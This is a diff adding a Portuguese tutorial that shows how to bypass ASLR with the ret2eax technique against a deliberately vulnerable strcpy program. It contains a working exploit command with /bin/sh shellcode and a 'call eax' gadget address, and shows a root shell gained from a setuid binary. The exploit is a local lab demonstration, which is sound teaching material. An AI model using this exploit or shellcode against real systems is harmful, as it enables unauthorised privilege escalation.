@@ -1,0 +1,186 @@
+Passando por ASLR com ret2eax
+
+
+1) Introdução
+2) Ambiente
+3) Código
+4) Verificando a viabilidade da exploração
+5) Exploração
+6) Binário
+7) Contato
+8) Referências
+
+
+1) Introdução
+
+  Neste artigo mostrarei como utilizar a técnica conhecida como ret2reg(return to register) para dar bypass em Address Space Layout Randomization(ASLR)[1], com exceção do Position-Independent Executable(PIE)[2], este tipo de técnica se baseia em como a stack funciona, chamada de 'stack juggling methods'[3].
+  O problema na exploração de stack-based buffer overflows com ASLR é que o endereço do nosso shellcode estará cada vez em um lugar diferente, devido a pseudo-aleatoriedade da stack, a ideia por traz do ret2reg é utilizar um endereço não-aleatório da área de 'text' por exemplo, que contenha um jmp ou call para para um registrador que esteja apontando para o nosso shellcode, ou seja, o atacante não precisa saber o endereço da onde esta o shellcode, mas se utiliza de um registrador que estará apontando para o mesmo.
+  A técnica que irei demonstrar é conhecida como ret2eax, ou seja, vamos ver um caso aonde o registrador eax estará apontando para o nosso shellcode, e iremos procurar um jmp ou call para eax, sobrescrevendo o endereço de retorno salvo na pilha por este endereço. 
+
+
+2) Ambiente 
+
+  O ambiente de testes aqui foi o ubuntu 11.04, kernel 2.6.38 e gcc 4.5.2.
+
+------------------------------------------------------------------------------------
+
+m0nad@m0nad-notebook:~$ cat /etc/issue.net 
+Ubuntu 11.04
+m0nad@m0nad-notebook:~$ uname -a
+Linux m0nad-notebook 2.6.38-13-generic #56-Ubuntu SMP Tue Feb 14 12:40:40 UTC 2012 i686 i686 i386 GNU/Linux
+m0nad@m0nad-notebook:~$ gcc --version
+gcc (Ubuntu/Linaro 4.5.2-8ubuntu4) 4.5.2
+Copyright (C) 2010 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.  There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+
+m0nad@m0nad-notebook:~$
+
+------------------------------------------------------------------------------------
+
+As proteções do sistema operacional pode ser encontrada no wiki do ubuntu[4]
+
+
+3) Código
+
+  Para a realização do ret2eax precisamos que o eax aponte para o shellcode, como sabemos que o valor de retorno fica em eax, e que a função strcpy retorna o endereço para o buffer, basta que a função que chamou o strcpy não coloque nenhum outro valor em eax, mantendo assim o endereço de eax para o buffer, que estará o nosso shellcode.
+  Vejamos o código:
+
+------------------------------------------------------------------------------------
+
+m0nad@m0nad-notebook:~$ cat ret2eax.c 
+#include <string.h>
+void 
+main(int argc, char ** argv) 
+{
+  char buf[256];
+  strcpy(buf, argv[1]);
+}
+
+------------------------------------------------------------------------------------
+
+  Vemos que a função main não retorna nada(ou seja, não irá alterar o valor de eax), isso fará com que o eax continue com o endereço do nosso buffer, ou seja com o endereço da onde estará o nosso shellcode.
+  Compilei o código sem Smash The Stack Protector(Propolice) utilizando a opção do gcc -fno-stack-protector, alem de permitir execução na stack, para que nosso shellcode possa ser executado, com o a opção do gcc -z execstack.
+
+------------------------------------------------------------------------------------
+
+m0nad@m0nad-notebook:~$ gcc -o ret2eax ret2eax.c -fno-stack-protector -z execstack
+
+------------------------------------------------------------------------------------
+
+  Utilizando o checksec.sh[5] verificamos as proteções ativas do binário.
+
+------------------------------------------------------------------------------------
+
+m0nad@m0nad-notebook:~$ bash checksec.sh --file ret2eax
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ret2eax
+
+------------------------------------------------------------------------------------
+
+  Podemos ver que o binário esta com RELRO parcial, sem SSP, sem Non eXecute ativado, sem PIE, sem relative path ou runpath.
+  Verificamos também que o ASLR esta ativo no kernel.
+
+------------------------------------------------------------------------------------
+
+m0nad@m0nad-notebook:~$ cat /proc/sys/kernel/randomize_va_space 
+2
+m0nad@m0nad-notebook:~$ 
+
+------------------------------------------------------------------------------------
+
+
+4) Verificando a viabilidade da exploração
+
+   Após compilar, vamos tentar controlar o eip dentro do depurador gdb.
+
+------------------------------------------------------------------------------------
+
+(gdb) r `perl -e 'print "A" x 268 . "B" x 4'`
+Starting program: /home/m0nad/ret2eax `perl -e 'print "A" x 268 . "B" x 4'`
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) 
+
+------------------------------------------------------------------------------------
+
+   Sucesso! controlamos o eip, vamos verificar se o eax esta apontando para o nosso buffer.
+
+------------------------------------------------------------------------------------
+
+(gdb) i r $eax
+eax            0xbffff100	-1073745664
+(gdb) x/s 0xbffff100
+0xbffff100:	 'A' <repete 200 vezes>...
+(gdb) 
+
+------------------------------------------------------------------------------------
+
+   Podemos ver que o eax esta apontando para o nossos 'A's, vamos então procurar se existe algum call para o eax.
+
+------------------------------------------------------------------------------------
+
+m0nad@m0nad-notebook:~$ objdump -D ret2eax | grep -E 'call\s*\*%eax'
+ 80483bf:	ff d0                	call   *%eax
+ 804847b:	ff d0                	call   *%eax
+m0nad@m0nad-notebook:~$ 
+
+------------------------------------------------------------------------------------
+
+   Encontramos, basta então colocarmos o shellcode seguido de algum lixo para encher o resto do buffer, e no final o endereço para o call eax, ficando algo como:
+
+------------------------------------------------------------------------------------
+
+[shellcode][lixo][&call eax]
+
+------------------------------------------------------------------------------------
+
+5) Exploração
+
+  Vamos a exploração, para fins de demonstração vamos setar o binário para suid root.
+
+------------------------------------------------------------------------------------
+
+m0nad@m0nad-notebook:~$ sudo chown root:root ret2eax
+[sudo] password for m0nad: 
+m0nad@m0nad-notebook:~$ sudo chmod +s ret2eax
+
+------------------------------------------------------------------------------------
+
+  O shellcode utilizado foi um simples execve para um /bin/sh, para aprender a construir o seu veja o meu artigo[6], utilizei nops para encher o buffer, seguido do endereço do call eax.
+
+------------------------------------------------------------------------------------
+
+m0nad@m0nad-notebook:~$ ./ret2eax `perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xd2\x52\x53\x89\xe1\xcd\x80" . "\x90" x 243 . "\xbf\x83\x04\x08"'`
+# id
+uid=1000(m0nad) gid=1000(m0nad) euid=0(root) egid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),46(plugdev),111(lpadmin),119(admin),122(sambashare),1000(m0nad)
+# 
+
+------------------------------------------------------------------------------------
+
+  r00t!
+  
+
+6) Binário
+
+  O binário utilizado pode ser encontrado no meu github[7]
+
+
+7) Contato
+
+Victor Ramos Mello (m0nad)
+victornrm at gmail.com | m0nad at email.com
+m0nadlabs.wordpress.com
+@m0nadlabs
+
+
+8) Referências
+
+[1] https://en.wikipedia.org/wiki/Address_space_layout_randomization
+[2] https://en.wikipedia.org/wiki/Position-independent_code
+[3] http://events.ccc.de/congress/2005/fahrplan/attachments/539-Paper_AdvancedBufferOverflowMethods.pdf
+[4] https://wiki.ubuntu.com/Security/Features
+[5] http://www.trapkit.de/tools/checksec.html
+[6] https://raw.github.com/m0nad/Papers/master/ConstruindoShellcodes.txt
+[7] https://github.com/m0nad/Papers/ret2eax
